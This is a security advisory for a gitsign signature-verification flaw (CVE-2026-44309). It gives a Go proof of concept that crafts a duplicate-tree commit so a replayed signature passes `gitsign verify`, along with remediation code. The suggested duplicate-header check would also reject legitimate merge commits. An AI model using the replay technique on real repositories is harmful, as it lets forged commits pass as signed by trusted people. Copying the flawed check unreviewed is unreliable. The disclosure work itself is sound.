# [M] gitsign verify accepts signatures over go-git-normalized bytes, enabling trust confusion on malformed commits

## Summary
Severity: Medium
Advisory: GHSA-7rmh-48mx-2vwc
CVE: CVE-2026-44309
CWE: CWE-295, CWE-347
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-7rmh-48mx-2vwc
Type: github-advisory

## Affected
- Go: `github.com/sigstore/gitsign` — affected >=0 <0.16.0

## Details
## Summary

`gitsign verify` and `gitsign verify-tag` re-encode commit/tag objects through go-git's `EncodeWithoutSignature` before checking the signature, instead of verifying against the raw git object bytes. For malformed objects with duplicate `tree` headers, git-core and go-git parse different trees: git-core uses the first, go-git uses the second. A signature crafted over the go-git-normalized form (second tree) passes `gitsign verify` while git-core resolves the commit to a completely different tree. This breaks the invariant that a verified signature, the commit semantics git-core presents to users, and the object hash logged in Rekor all refer to the same content.

## Severity

**Medium** (CVSS 3.1: 5.7)

`CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N`

- **Attack Vector:** Network — a malformed commit can be distributed via any accessible git remote
- **Attack Complexity:** High — exploitation requires crafting malformed objects that also bypass git server fsck checks (not universally enabled)
- **Privileges Required:** None — the most impactful form (signature replay) requires no signing key
- **User Interaction:** Required — a victim must run `gitsign verify` on the malformed commit
- **Scope:** Unchanged — impact is confined to the repository under verification
- **Confidentiality Impact:** None
- **Integrity Impact:** High — a verified signature appears to endorse content different from what git-core resolves and presents to users
- **Availability Impact:** None

## Affected Component

- `internal/commands/verify/verify.go` — `(o *options).Run` (line 75)
- `internal/commands/verify-tag/verify_tag.go` — `(o *options).Run` (line 77)
- `pkg/git/verify.go` — `ObjectHash` (lines 126–158, specifically the `commit()` round-trip at 161–176)

## CWE

- **CWE-347**: Improper Verification of Cryptographic Signature
- **CWE-295**: Improper Certificate Validation (secondary — the mismatch allows a cert to appear to cover content it never covered)

## Description

### Root cause: re-encoding instead of raw-byte verification

When `gitsign verify` is invoked, the commit is opened via go-git and its body is reconstructed through `EncodeWithoutSignature` before being passed to the cryptographic verifier:

```go
// internal/commands/verify/verify.go:63–92
c, err := repo.CommitObject(*h)          // go-git parses the raw object
...
c2 := new(plumbing.MemoryObject)
if err := c.EncodeWithoutSignature(c2); err != nil {  // re-encodes canonical form
    return err
}
r, _ := c2.Reader()
data, _ := io.ReadAll(r)

summary, err := v.Verify(ctx, data, sig, true)   // verifies re-encoded bytes, not raw bytes
```

The same pattern appears in `verify-tag`:

```go
// internal/commands/verify-tag/verify_tag.go:76–95
tagData := new(plumbing.MemoryObject)
if err := tagObj.EncodeWithoutSignature(tagData); err != nil {
    return err
}
```

### The loose-parsing assumption in go-git

The codebase itself acknowledges the problem in `ObjectHash`:

```go
// pkg/git/verify.go:137–142
// We're making big assumptions here about the ordering of fields
// in Git objects. Unfortunately go-git does loose parsing of objects,
// so it will happily decode objects that don't match the unmarshal type.
// We should see if there's a better way to detect object types.
switch {
case bytes.HasPrefix(data, []byte("tree ")):
    encoder, err = commit(obj, sig)
```

go-git's loose parsing means that for a commit containing two `tree` headers, it silently discards the first and retains the second. `EncodeWithoutSignature` then produces a canonical commit body containing only the second tree — which can differ from what git-core resolves.

### Divergent verification paths confirm the inconsistency

The `git verify-commit` path (`internal/commands/root/verify.go`) receives the raw commit bytes directly from git-core and does **not** re-encode them:

```go
// internal/commands/root/verify.go:56–70
detached := len(args) >= 2
if detached {
    data, sig, err = readDetached(s, args...)  // raw bytes from git-core
} else {
    sig, err = readAttached(s, args...)
}
...
summary, err := v.Verify(ctx, data, sig, true)  // raw bytes, no re-encoding
```

The two paths therefore reach opposite conclusions for the same malformed commit: `git verify-commit` fails (raw bytes with both trees ≠ signed canonical bytes), while `gitsign verify` succeeds (re-encoded bytes match signed bytes).

### Concrete attack: signature replay without a signing key

An attacker does not need a signing key to trigger the confusion. Given any existing legitimately gitsign-signed commit from Alice:

```
tree T1                        ← Alice's real tree (what go-git and gitsign see)
author Alice <alice@corp.com> ...
committer Alice <alice@corp.com> ...
gpgsig -----BEGIN SIGNED MESSAGE-----
 <Alice's valid signature over T1 canonical form>
 -----END SIGNED MESSAGE-----

This is Alice's commit.
```

An attacker crafts a new malformed commit object:

```
tree T2                        ← attacker's malicious tree (git-core uses this)
tree T1                        ← Alice's tree (go-git uses this)
author Alice <alice@corp.com> ...
committer Alice <alice@corp.com> ...
gpgsig -----BEGIN SIGNED MESSAGE-----
 <Alice's valid signature — replayed verbatim>
 -----END SIGNED MESSAGE-----

This is Alice's commit.
```

- **`gitsign verify`**: go-git picks T1, re-encodes, Alice's signature verifies. Output: "Good signature from alice@corp.com."
- **`git log` / `git-core`**: uses T2 (attacker-controlled content).
- **Rekor lookup**: `ObjectHash` also goes through the go-git round-trip, so the logged hash is the T1-canonical hash — consistent with the forged verification output but not with the actual raw object.

The attack requires only that the malformed object be accepted into the local repository (bypassing server-side fsck), and that the victim runs `gitsign verify`.

## Proof of Concept

```go
// poc_tree_mismatch.go — run from repo root: go run ./poc_tree_mismatch.go
package main

import (
    "context"
    "crypto"
    "crypto/ecdsa"
    "crypto/elliptic"
    "crypto/rand"
    "crypto/x509"
    "crypto/x509/pkix"
    "fmt"
    "io"
    "math/big"
    "strings"
    "time"

    "github.com/go-git/go-git/v5/plumbing"
    "github.com/go-git/go-git/v5/plumbing/object"
    "github.com/go-git/go-git/v5/storage/memory"
    "github.com/sigstore/gitsign/internal/signature"
    ggit "github.com/sigstore/gitsign/pkg/git"
)

type identity struct {
    cert *x509.Certificate
    priv crypto.Signer
}

func (i *identity) Certificate() (*x509.Certificate, error)       { return i.cert, nil }
func (i *identity) CertificateChain() ([]*x509.Certificate, error) { return []*x509.Certificate{i.cert}, nil }
func (i *identity) Signer() (crypto.Signer, error)                { return i.priv, nil }
func (i *identity) Delete() error                                  { return nil }
func (i *identity) Close()                                         {}

func indentSig(sig string) string {
    sig = strings.TrimSuffix(sig, "\n")
    lines := strings.Split(sig, "\n")
    out := "gpgsig " + lines[0] + "\n"
    for _, ln := range lines[1:] {
        out += " " + ln + "\n"
    }
    return out
}

func main() {
    priv, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
    tmpl := &x509.Certificate{
        SerialNumber:          big.NewInt(1),
        Subject:               pkix.Name{CommonName: "attacker"},
        NotBefore:             time.Now().Add(-time.Minute),
        NotAfter:              time.Now().Add(time.Hour),
        KeyUsage:              x509.KeyUsageDigitalSignature,
        ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageCodeSigning},
        BasicConstraintsValid: true,
    }
    rawCert, _ := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &priv.PublicKey, priv)
    cert, _ := x509.ParseCertificate(rawCert)

    treeFirst  := strings.Repeat("a", 40) // git-core uses this
    treeSecond := strings.Repeat("b", 40) // go-git uses this
    author     := "author Eve <eve@example.com> 1700000000 +0000"
    committer  := "committer Eve <eve@example.com> 1700000000 +0000"
    msg        := "msg\n"

    // Sign the go-git canonical form (second tree only)
    canonicalData := fmt.Sprintf("tree %s\n%s\n%s\n\n%s", treeSecond, author, committer, msg)
    id := &identity{cert: cert, priv: priv}
    resp, err := signature.Sign(context.Background(), id, []byte(canonicalData),
        signature.SignOptions{Detached: true, Armor: true, IncludeCerts: 0})
    if err != nil {
        panic(err)
    }

    // Craft malformed raw commit: first=treeFirst (git-core), second=treeSecond (go-git)
    malformedRaw := fmt.Sprintf("tree %s\ntree %s\n%s\n%s\n%s\n%s",
        treeFirst, treeSecond, author, committer, indentSig(string(resp.Signature)), msg)

    st := memory.NewStorage()
    enc := st.NewEncodedObject()
    enc.SetType(plumbing.CommitObject)
    w, _ := enc.Writer()
    _, _ = w.Write([]byte(malformedRaw))
    _ = w.Close()
    c, err := object.DecodeCommit(st, enc)
    if err != nil {
        panic(err)
    }

    // Reproduce what gitsign verify does
    out := new(plumbing.MemoryObject)
    if err := c.EncodeWithoutSignature(out); err != nil {
        panic(err)
    }
    r, _ := out.Reader()
    verifyData, _ := io.ReadAll(r)

    roots := x509.NewCertPool()
    roots.AddCert(cert)
    v, _ := ggit.NewCertVerifier(ggit.WithRootPool(roots))
    _, verr := v.Verify(context.Background(), verifyData, []byte(c.PGPSignature), true)

    objHash, oerr := ggit.ObjectHash(verifyData, []byte(c.PGPSignature))
    rawObj := &plumbing.MemoryObject{}
    rawObj.SetType(plumbing.CommitObject)
    _, _ = rawObj.Write([]byte(malformedRaw))

    fmt.Println("FIRST_TREE_IN_RAW (git-core):", treeFirst)
    fmt.Println("SECOND_TREE_IN_RAW (go-git):", treeSecond)
    fmt.Println("GO_GIT_PARSED_TREE:", c.TreeHash.String())
    fmt.Println("VERIFY_DATA_EQUALS_CANONICAL:", string(verifyData) == canonicalData)
    fmt.Println("CERT_VERIFY_ERROR:", verr)           // nil = signature accepted
    fmt.Println("OBJECTHASH_ERROR:", oerr)
    fmt.Println("OBJECTHASH_FROM_VERIFY_DATA:", objHash)
    fmt.Println("RAW_MALFORMED_COMMIT_HASH:", rawObj.Hash().String()) // differs from objHash
}
```

**Expected output:**

```
FIRST_TREE_IN_RAW (git-core): aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
SECOND_TREE_IN_RAW (go-git):  bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
GO_GIT_PARSED_TREE:            bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
VERIFY_DATA_EQUALS_CANONICAL:  true
CERT_VERIFY_ERROR:             <nil>          ← signature accepted
OBJECTHASH_ERROR:              <nil>
OBJECTHASH_FROM_VERIFY_DATA:   <hash of canonical form>
RAW_MALFORMED_COMMIT_HASH:     <different hash>   ← hash mismatch confirms split
```

## Impact

- **Signature binding bypass**: `gitsign verify` reports a valid signature from a trusted identity for a commit that git-core resolves to completely different content (a different tree).
- **Signature replay without a key**: An attacker can reuse any existing gitsign-signed commit to produce a new commit that passes `gitsign verify` but points to attacker-controlled content, without possessing any signing key.
- **Rekor tlog inconsistency**: `ObjectHash` also goes through the go-git round-trip, so the hash stored in or looked up from the transparency log is the normalized hash, not the raw object hash. An auditor cross-referencing the tlog hash against the actual object store will see a mismatch.
- **Verification path divergence**: `git verify-commit` and `gitsign verify` reach opposite verdicts for the same malformed commit, undermining auditability.

## Recommended Remediation

### Option 1: Verify against raw bytes (preferred)

Change the `gitsign verify` and `gitsign verify-tag` CLI commands to read the raw object bytes from the git object store and strip the signature header manually, mirroring what git-core does and what `commandVerify` already does when called by `git verify-commit`:

```go
// internal/commands/verify/verify.go — replace lines 63–92
enc, err := repo.Storer.EncodedObject(plumbing.CommitObject, *h)
if err != nil {
    return fmt.Errorf("error reading encoded commit object: %w", err)
}
r, err := enc.Reader()
if err != nil {
    return err
}
rawBytes, err := io.ReadAll(r)
if err != nil {
    return err
}
data, sig, err := git.ExtractSignatureFromRawObject(rawBytes)
if err != nil {
    return err
}
// data is now the raw bytes without the gpgsig header — identical to what git-core passes
summary, err := v.Verify(ctx, data, sig, true)
```

This aligns the CLI verification path with the `commandVerify` (git verify-commit) path that already handles raw bytes correctly.

### Option 2: Detect and reject malformed objects

Add a pre-verification check in `ObjectHash` and in the verification path that rejects objects with duplicate field headers (duplicate `tree`, `parent`, `author`, `committer`), returning an error rather than silently normalizing:

```go
func validateRawCommitFields(data []byte) error {
    seen := map[string]bool{}
    for _, line := range bytes.Split(data, []byte("\n")) {
        if idx := bytes.IndexByte(line, ' '); idx > 0 {
            key := string(line[:idx])
            if seen[key] {
                return fmt.Errorf("malformed commit: duplicate field %q", key)
            }
            seen[key] = true
        }
        if len(line) == 0 {
            break // end of headers
        }
    }
    return nil
}
```

This is a defense-in-depth measure but does not address the fundamental architectural issue of verifying re-encoded bytes.

## Credit

This vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).

## References
- https://github.com/sigstore/gitsign/security/advisories/GHSA-7rmh-48mx-2vwc
- https://nvd.nist.gov/vuln/detail/CVE-2026-44309
- https://github.com/sigstore/gitsign
